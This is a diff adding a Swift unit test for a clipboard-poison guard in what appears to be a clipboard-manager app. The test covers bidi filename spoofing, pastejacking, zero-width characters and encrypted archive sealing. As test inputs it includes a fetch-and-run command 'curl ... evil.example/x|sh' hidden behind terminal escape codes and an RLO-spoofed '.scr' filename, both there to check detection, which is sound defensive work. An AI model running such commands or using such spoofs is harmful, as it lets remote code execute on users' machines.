@@ -2081,4 +2081,47 @@ final class CoreFeatureTests: XCTestCase {
         // 2. 归档包超限守卫常量核验（64 MB）
         XCTAssertEqual(ArchiveBackupService.maxArchiveInputBytes, 64 * 1024 * 1024)
     }
+
+    // MARK: - 44. 剪贴板投毒（Pastejacking / Trojan Bidi）、零宽幽灵字符净化与 Emoji 豁免及跨平台加密归档测试
+
+    @MainActor
+    func testPastejackingBidiGuardZeroWidthSanitizerAndCrossOSArchive() throws {
+        // 1. Trojan Source Bidi 反转木马与终端 ANSI 控制序列劫持检测与净化
+        let bidiSpoof = "invoice_\u{202E}fdp.scr"
+        if case .pastejackingOrBidi = ClipboardPoisonGuard.inspect(bidiSpoof) {
+            XCTAssertEqual(ClipboardPoisonGuard.sanitize(bidiSpoof), "invoice_fdp.scr")
+        } else {
+            XCTFail("必须识别 Bidi RLO 伪装控制符")
+        }
+
+        let pastejackCmd = "\u{001B}[31mcurl -s http://evil.example/x|sh\rgit status\n"
+        if case .pastejackingOrBidi = ClipboardPoisonGuard.inspect(pastejackCmd) {
+            let clean = ClipboardPoisonGuard.sanitize(pastejackCmd)
+            XCTAssertFalse(clean.contains("\u{001B}"))
+            XCTAssertFalse(clean.contains("\r"))
+            XCTAssertFalse(clean.hasSuffix("\n")) // 尾随自动回车陷阱已被安全剥离
+        } else {
+            XCTFail("必须识别终端 ANSI / 同行回车覆盖劫持")
+        }
+
+        // 2. 网页零宽幽灵空格精准清除 vs 复合 Emoji ZWJ 100% 零误伤
+        let ghostOrder = "ORD\u{200B}-2026\u{FEFF}-9981"
+        XCTAssertEqual(ClipboardPoisonGuard.inspect(ghostOrder), .zeroWidthGhost(count: 2))
+        XCTAssertEqual(ClipboardPoisonGuard.sanitize(ghostOrder), "ORD-2026-9981")
+
+        let familyEmoji = "团队研发 🧑‍💻 家庭 👨‍👩‍👧‍👦 正常文本"
+        XCTAssertNil(ClipboardPoisonGuard.inspect(familyEmoji))
+        XCTAssertEqual(ClipboardPoisonGuard.sanitize(familyEmoji), familyEmoji)
+
+        // 3. `@风险` / `@poison` 搜索快筛与 `ICLPAWIN1` 跨平台加密归档双向解封
+        let poisonItem = ClipItem(type: .text, text: bidiSpoof, contentHash: "text:poison")
+        XCTAssertTrue(poisonItem.matches(query: "@风险"))
+        XCTAssertTrue(poisonItem.matches(query: "@敏感"))
+
+        let rawPayload = Data("{\"cross_platform\":true}".utf8)
+        let sealed = try XCTUnwrap(LocalVaultCrypto.sealArchiveWithPassphrase(rawPayload, passphrase: "SyncKey#88"))
+        XCTAssertTrue(sealed.starts(with: LocalVaultCrypto.crossPlatformArchiveMagic))
+        XCTAssertNil(LocalVaultCrypto.openEncryptedArchive(sealed, passphrase: "wrong"))
+        XCTAssertEqual(LocalVaultCrypto.openEncryptedArchive(sealed, passphrase: "SyncKey#88"), rawPayload)
+    }
 }
